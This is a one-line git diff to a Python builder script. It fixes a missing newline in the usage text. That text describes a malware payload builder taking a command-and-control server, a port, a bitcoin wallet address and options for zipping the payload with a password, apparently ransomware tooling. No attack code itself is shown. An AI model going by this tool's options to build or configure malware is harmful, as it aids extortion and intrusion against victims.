@@ -70,7 +70,7 @@ if __name__ == "__main__":
         print("\nUSAGE: python3 builder.py -d cncserver.com -w btc_wallet_address [-p] [-zp -zpm] [-we] [-pa] [-t]\n\n" \
                 "ARGS:\n\n" \
                 "-d [cncserver.com] : command and control server ip/url (NO http[s]://)\n" \
-                "-w [bitcoin wallet address] : command to program in your bitcoin wallet address" \
+                "-w [bitcoin wallet address] : command to program in your bitcoin wallet address\n" \
                 "-p [4444] : command and control server port (DEFAULT 8080 IF NO FLAG PASSED)\n" \
                 "-zp : prompt for archive password when zipping payload\n" \
                 "-zpm [password] : manually enter archive password when zipping payload\n" \
